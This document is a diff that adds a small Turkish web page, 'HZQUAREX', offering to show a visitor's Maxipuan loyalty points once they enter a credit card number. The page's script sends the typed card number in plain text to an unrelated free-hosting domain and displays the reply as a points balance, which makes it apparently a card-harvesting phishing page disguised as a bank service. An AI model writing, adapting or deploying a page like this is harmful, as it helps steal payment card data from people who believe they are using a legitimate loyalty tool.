@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HZQUAREX</title>
+</head>
+<body style="font-family: Arial; text-align: center; padding: 30px;">
+  <h1>HZQUAREX</h1>
+  <p>Kart numaranızı girin, Maxipuan'ınızı görün</p>
+
+  <input type="text" id="cardInput" placeholder="Kredi kartı numarası" />
+  <button onclick="getPoints()">Maxipuanı Getir</button>
+
+  <p id="result" style="margin-top: 20px; font-weight: bold;"></p>
+
+  <script>
+    function getPoints() {
+      const card = document.getElementById("cardInput").value;
+      const resultEl = document.getElementById("result");
+      if (!card) {
+        resultEl.innerText = "Lütfen kart numarası girin.";
+        return;
+      }
+
+      fetch("https://solwinsystemm.rf.gd/api.php?card=" + card)
+        .then((res) => res.text())
+        .then((data) => {
+          resultEl.innerText = "Maxipuan: " + data;
+        })
+        .catch(() => {
+          resultEl.innerText = "Bir hata oluştu.";
+        });
+    }
+  </script>
+</body>
+</html>
